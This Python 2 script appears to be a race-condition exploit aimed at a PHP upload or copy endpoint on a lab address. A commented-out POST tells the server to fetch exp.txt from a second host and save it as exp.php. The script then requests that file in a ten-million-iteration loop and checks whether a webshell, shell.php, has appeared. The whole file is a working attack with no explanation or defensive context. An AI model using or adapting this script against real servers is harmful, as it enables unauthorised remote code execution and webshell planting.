#encodeing:utf-8

import requests

def test():

    # posturl = 'http://192.168.1.106/scripts/conditions_compete.php'
    postdata = {
        'file':'http://192.168.1.107/scripts/exp.txt',
        'path':'exp.php'
        }



    geturl  = 'http://192.168.1.106/scripts/exp.php'
    shellurl = 'http://192.168.1.106/scripts/shell.php'

    for i in xrange(10000000):
        # post_res = requests.post(posturl, data=postdata)
        # if post_res:
            # print 'post status:', post_res.status_code
        # print post_res.content
        get_res = requests.get(geturl)
        print get_res.status_code
        # print get_res.content

        # if get_res:
            # print 'get_res status:', get_res.status_code
        res = requests.get(shellurl)
        if res:
            print 'get webshell successfully....'
        print res.status_code
            # print res.history
        # raw_input('test')


if __name__ == '__main__':

    test()


